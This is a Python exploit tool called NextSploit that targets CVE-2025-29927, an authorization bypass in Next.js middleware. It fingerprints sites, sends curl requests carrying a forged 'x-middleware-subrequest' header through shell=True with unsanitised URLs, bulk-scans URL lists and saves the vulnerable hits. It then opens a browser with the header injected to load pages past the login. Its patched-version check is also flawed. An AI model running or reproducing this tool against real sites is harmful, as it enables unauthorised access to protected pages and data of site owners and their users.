# ============================================
# NextSploit Test File
# Purpose: This file is intended for testing and
# reviewing community Pull Requests without affecting
# the main NextSploit.py script.
#
# Note: This is not the final version and may be 
# replaced or merged later.
# ============================================

import random
import os
import sys
import time
import subprocess
import importlib.util
import signal
from colorama import Fore, init
import json
import requests

init(autoreset=True)

ORANGE = '\033[38;5;214m'
LIGHT_PINK = '\033[38;5;176m'
SALMON = '\033[38;5;209m'
BRIGHT_WHITE  = '\033[38;5;231m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_package_installed(package):
    return importlib.util.find_spec(package) is not None

def install_package(package_name):
    result = subprocess.run([sys.executable, '-m', 'pip', 'install', package_name], capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"{Fore.GREEN}[+] {package_name} installed successfully.")
    else:
        print(f"{Fore.RED}[!] Failed to install {package_name}")

def check_and_install_packages(packages):
    for package in packages:
        time.sleep(1)
        if is_package_installed(package):
            print(f"{Fore.GREEN}[+] {package} is already installed.")
        else:
            print(f"{Fore.RED}[!] {package} is missing. Installing...")
            install_package(package)

def fetch_required_modules():
    return (
        "wappalyzer",
        "requests",
        "colorama",
        "selenium",
        "prompt_toolkit"
    )

def handle_interrupt(signal, frame):
    print(f"{Fore.RED}\n[!] Program interrupted. Exiting instantly...")
    sys.exit(0)

def display_banner():
    banner = rf"""
{Fore.GREEN}   _______      ________    ___   ___ ___  _____     ___   ___   ___ ___ ______ 
{Fore.GREEN}  / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|   |__ \ / _ \ / _ \__ \____  |
{Fore.GREEN} | |     \ \  / /| |__ ______ ) | | | | ) | |__ ______ ) | (_) | (_) | ) |  / / 
{Fore.GREEN} | |      \ \/ / |  __|______/ /| | | |/ /|___ \______/ / \__, |\__, |/ /  / /  
{Fore.GREEN} | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_   / /   / // /_ / /   
{Fore.GREEN}  \_____|   \/   |______|  |____|\___/____|____/    |____| /_/   /_/|____/_/    
    """

    print(banner)
    creator_text = "Program created by: AnonKryptiQuz"
    padding = (81 - len(creator_text)) // 2
    print(" " * padding + f"{Fore.RED}{creator_text}")
    print("")

def get_valid_url():
    from prompt_toolkit import prompt
    from prompt_toolkit.completion import PathCompleter

    while True:
        clear_screen()
        display_banner()
        url = input(f"{BRIGHT_WHITE}[?] Enter URL (or press Enter to use file): {Fore.CYAN}").strip()

        if url == "":
            try:
                filepath = prompt("[?] Enter the path to the file containing URLs: ", completer=PathCompleter())

                if not os.path.isfile(filepath):
                    print(f"{Fore.RED}\n[!] File not found.")
                    time.sleep(1)
                    print(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    input()
                    continue

                with open(filepath, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                if not urls:
                    print(f"{Fore.RED}[!] File is empty. Try another file.")
                    time.sleep(2)
                    continue
                return urls

            except Exception as e:
                print(f"{Fore.RED}[!] Error reading file: {e}")
                time.sleep(2)
        elif not is_valid_url(url):
            print(f"{Fore.RED}\n[!] Invalid URL. Make sure it starts with 'http://' or 'https://'.")
            time.sleep(1)
            print(f"{Fore.YELLOW}[i] Press Enter to try again...")
            input()
        else:
            print(f"{Fore.YELLOW}\n[i] Loading Please Wait...")
            time.sleep(3)
            return [url]

def is_valid_url(url):
    return url.startswith("http://") or url.startswith("https://")

def get_scan_type():
    while True:
        clear_screen()
        display_banner()
        print(f"{BRIGHT_WHITE}[?] Please select the type of scan you want to perform:")
        print(f"{BRIGHT_WHITE} 1. Fast\n 2. Balanced\n 3. Full (Default)")

        choice = input(f"{Fore.LIGHTMAGENTA_EX}\n[?] Please choose an option to continue (Press Enter for Full): {Fore.CYAN}").strip()

        if choice == "1":
            return "fast"
        elif choice == "2":
            return "balanced"
        elif choice == "3" or choice == "":
            return "full" 
        else:
            print(f"{Fore.RED}\n[!] Invalid choice selected. Please try again.")
            time.sleep(1)
            print(f"{Fore.YELLOW}[i] Press Enter to try again...{Fore.RESET}")
            input()


def check_react_version(url, scan_type):
    global MIDDLEWARE_VALUE
    scan_command = ['wappalyzer', '-i', url, '--scan-type', scan_type, '-t', '10', '-oJ', 'output.json']
    
    result = subprocess.run(scan_command, capture_output=True, text=True)

    if "geckodriver" in result.stderr.lower() and "not be compatible" in result.stderr.lower():
        print(f"{Fore.RED}[!] Geckodriver version issue detected!")
        time.sleep(2)
        print(f"{Fore.RED}[!] WRN: {LIGHT_PINK}Your installed geckodriver might not be compatible with Firefox. {SALMON}(Ignoring may result in FPs & FNs)\n")
    
    if result.returncode != 0:
        print(f"{Fore.RED}[!] Failed to analyze the website. Make sure Wappalyzer is installed correctly.")
        return
    
    if not os.path.exists("output.json"):
        print(f"{Fore.RED}[!] Wappalyzer did not produce an output file. Make sure it is installed and working properly.")
        return
    
    try:
        with open("output.json", "r") as file:
            data = json.load(file)

            if not data:
                print(f"{Fore.RED}[!] Wappalyzer scan returned an empty result. Ensure the website is accessible.")
                return

            site_data = data.get(url, {})

            time.sleep(2)

            nextjs_info = site_data.get("Next.js", None)
            if nextjs_info:
                nextjs_version = nextjs_info.get('version', None)
                if nextjs_version:
                    print(f"{SALMON}[+] Next.js is used on this website, version: {nextjs_version}")

                    def version_tuple(version):
                        return tuple(map(int, version.split(".")))

                    time.sleep(1)

                    if version_tuple(nextjs_version) >= version_tuple("14.2.25") or version_tuple(nextjs_version) >= version_tuple("15.2.3"):
                        print(f"{Fore.RED}\n[-] Not within Vulnerable range.")
                    else:
                        print(f"{LIGHT_PINK}[+] Within Vulnerable range.")

                        time.sleep(2)

                        if version_tuple(nextjs_version) < version_tuple("12.0.0"):
                            MIDDLEWARE_VALUE = "_middleware"
                            cmd = f'curl -H "x-middleware-subrequest: _middleware" {url}'
                            print(f"{Fore.YELLOW}[i] Running _middleware test (Next.js < 12)...")
                        else:
                            MIDDLEWARE_VALUE = "middleware"
                            cmd = f'curl -H "x-middleware-subrequest: middleware" {url}'
                            print(f"{ORANGE}[i] Running middleware test (Next.js >= 12 but < 14.2.25/15.2.3)...")

                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                        time.sleep(2)

                        if result.stdout.strip():
                            print(f"{Fore.GREEN}\n[+] Website is vulnerable to CVE-2025-29927!")
                            time.sleep(2)
                            
                            open_bypassed_page(url)
                        else:
                            print(f"{Fore.RED}\n[!] Website is not vulnerable!")

                else:
                    print(f"{Fore.YELLOW}[i] Next.js is used on this website, but version information is not available.")
            else:
                print(f"{Fore.RED}[!] This website is not based on Next.js.")
    
    except Exception as e:
        print(f"{Fore.RED}[!] Error parsing the output: {e}")
    finally:
        if os.path.exists("output.json"):
            os.remove("output.json")

def open_bypassed_page(url):
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options

    global MIDDLEWARE_VALUE

    if not MIDDLEWARE_VALUE:
        print(f"{Fore.RED}[!] Middleware value is not set. Aborting!")
        return

    print(f"{Fore.CYAN}\n[i] Opening the website with bypassed login...\n")
    time.sleep(2)

    chromedriver_path = "chromedriver.exe" if os.name == "nt" else "/usr/bin/chromedriver"

    chrome_options = Options()
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option("useAutomationExtension", False)
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-background-networking")
    chrome_options.add_argument("--disable-default-apps")
    chrome_options.add_argument("--disable-sync")
    chrome_options.add_argument("--disable-translate") 
    chrome_options.add_argument("--disable-popup-blocking")


    service = Service(chromedriver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)

    driver.execute_cdp_cmd("Network.enable", {})
    driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {
        "headers": {
            "x-middleware-subrequest": str(MIDDLEWARE_VALUE) 
        }
    })

    driver.get(url)

    input(f"{Fore.YELLOW}[i] Press Enter to terminate the program\n")
    driver.quit()
    sys.exit(0)

def main():
    from itertools import count
    signal.signal(signal.SIGINT, handle_interrupt)
    clear_screen()
    print(f"{Fore.YELLOW}[i] Checking for required packages...\n")
    required_packages = fetch_required_modules()
    check_and_install_packages(required_packages)
    time.sleep(3)

    urls = get_valid_url()

    if len(urls) > 1:
        scan_type = "full"
    else:
        scan_type = get_scan_type()

    print(f"{Fore.YELLOW}\n[i] Loading Please Wait...")
    time.sleep(3)
    clear_screen()
    display_banner()

    if len(urls) == 1:
        url = urls[0]
        
        print(f"{Fore.MAGENTA}[?] Scanning: {url}\n")

        time.sleep(1)

        print(f"{Fore.CYAN}[i] Checking if the website is based on Next.js")
        time.sleep(1)
        print(f"{ORANGE}[i] Scan Type: {scan_type}\n")
        check_react_version(url, scan_type)
    else:
        start_time = time.time()
        results = []
        print(f"{SALMON}[?] The File has uploaded")
        print(f"{Fore.YELLOW}[i] Scan Type: {scan_type}")
        print(f"{Fore.MAGENTA}[i] Total URLs to be scanned: {len(urls)}\n")
        time.sleep(1)

        import concurrent.futures
        from threading import Lock

        lock = Lock()
        results = []

        print_counter = count(1)

        def custom_check_version(index, url, scan_type):
            global MIDDLEWARE_VALUE
            scan_command = ['wappalyzer', '-i', url, '--scan-type', scan_type, '-t', '10', '-oJ', f'output_{index}.json']

            result = subprocess.run(scan_command, capture_output=True, text=True)

            if "geckodriver" in result.stderr.lower() and "not be compatible" in result.stderr.lower():
                print(f"{Fore.RED}[!] Geckodriver version issue detected!")
                time.sleep(2)
                print(f"{Fore.RED}[!] WRN: {LIGHT_PINK}Your installed geckodriver might not be compatible with Firefox. {SALMON}(Ignoring may result in FPs & FNs)\n")

            if result.returncode != 0:
                print(f"{Fore.RED}[!] Failed to analyze the website. Make sure Wappalyzer is installed correctly.")
                return

            output_file = f"output_{index}.json"
            if not os.path.exists(output_file):
                print(f"{Fore.RED}[!] Wappalyzer did not produce output file for {url}.")
                return

            status = "Not vulnerable"
            try:
                with open(output_file, "r") as file:
                    data = json.load(file)
                    site_data = data.get(url, {})
                    nextjs_info = site_data.get("Next.js", None)
                    if nextjs_info:
                        nextjs_version = nextjs_info.get("version", "")
                        if nextjs_version:
                            def version_tuple(version):
                                return tuple(map(int, version.split(".")))

                            if version_tuple(nextjs_version) >= version_tuple("14.2.25") or version_tuple(nextjs_version) >= version_tuple("15.2.3"):
                                status = "Not vulnerable"
                            else:
                                if version_tuple(nextjs_version) < version_tuple("12.0.0"):
                                    middleware_value = "_middleware"
                                else:
                                    middleware_value = "middleware"

                                cmd = f'curl -H "x-middleware-subrequest: {middleware_value}" {url}'
                                curl_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

                                if curl_result.stdout.strip():
                                    status = "Vulnerable"
            except Exception as e:
                print(f"{Fore.RED}[!] Error processing URL {url}: {e}")
            finally:
                pass
                if os.path.exists(output_file):
                    os.remove(output_file)

            with lock:
                num = next(print_counter)
                results.append((url, status))
                if status == "Vulnerable":
                    print(f"{Fore.WHITE}{num}. Scanning URL: {Fore.CYAN}{url} {Fore.MAGENTA}-{Fore.GREEN} Vulnerable")
                else:
                    print(f"{Fore.WHITE}{num}. Scanning URL: {Fore.CYAN}{url} {Fore.MAGENTA}-{Fore.RED} Not vulnerable")

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [
                executor.submit(custom_check_version, idx + 1, url, scan_type)
                for idx, url in enumerate(urls)
            ]
            concurrent.futures.wait(futures)

        end_time = time.time()
        total_vuln = sum(1 for _, result in results if result == "Vulnerable")

        time.sleep(1)
        print(f"\n{ORANGE}[i] Scan Completed.")
        print(f"{ORANGE}[i] Total URLs Scanned: {len(urls)}")
        print(f"{ORANGE}[i] Found {total_vuln}")
        print(f"{ORANGE}[i] Time taken: {int(end_time - start_time)} seconds\n")

        if total_vuln > 0:
            save = input(f"{Fore.WHITE}[?] Do you want to save the vulnerable URLs to a file? (y/n, Press Enter for n): {Fore.CYAN}").strip().lower()
            if save == "y":
                output_filename = f"vulnerable_urls_{int(time.time())}.txt"
                with open(output_filename, "w") as f:
                    for url, result in results:
                        if result == "Vulnerable":
                            f.write(f"{url}\n")
                print(f"{Fore.GREEN}[+] Vulnerable URLs saved to {output_filename}\n")
            else:
                print(f"{Fore.YELLOW}[i] Skipping save...\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Operation interrupted. Exiting instantly...")
        sys.exit(0)
